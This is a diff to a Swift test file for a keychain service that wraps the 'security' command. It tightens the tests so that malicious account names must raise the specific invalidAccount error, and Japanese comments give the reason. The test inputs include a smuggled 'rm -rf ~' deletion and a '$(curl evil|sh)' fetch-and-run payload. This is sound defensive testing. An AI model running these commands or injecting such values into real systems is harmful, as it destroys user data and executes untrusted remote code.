@@ -425,15 +425,17 @@ struct KeychainServiceSinkValidationTests {
         let service = SecurityCLIKeychainService()
         service.securityBinOverrideForTesting = "/nonexistent/security-test-stub"
         service.keychainLockedProbeForTesting = { false }
-        #expect(throws: KeychainError.self) {
-            try service.save(value: "x", for: "EVIL\"; rm -rf ~; #")
+        // invalidAccount をケース一致で検証する: 型だけだと、ガードが消えて
+        // subprocess 起動失敗 (unexpectedStatus) に落ちても緑になってしまい、
+        // このテストが守るはずの回帰を検出できない（#183 レビュー SF-6）。
+        func expectInvalidAccount(_ name: String) {
+            do { try service.save(value: "x", for: name); Issue.record("expected invalidAccount for \(name)") }
+            catch KeychainError.invalidAccount {}
+            catch { Issue.record("expected invalidAccount for \(name), got \(error)") }
         }
-        #expect(throws: KeychainError.self) {
-            try service.save(value: "x", for: "has space")
-        }
-        #expect(throws: KeychainError.self) {
-            try service.save(value: "x", for: "X=x $(curl evil|sh)")
-        }
+        expectInvalidAccount("EVIL\"; rm -rf ~; #")
+        expectInvalidAccount("has space")
+        expectInvalidAccount("X=x $(curl evil|sh)")
     }
 }
 
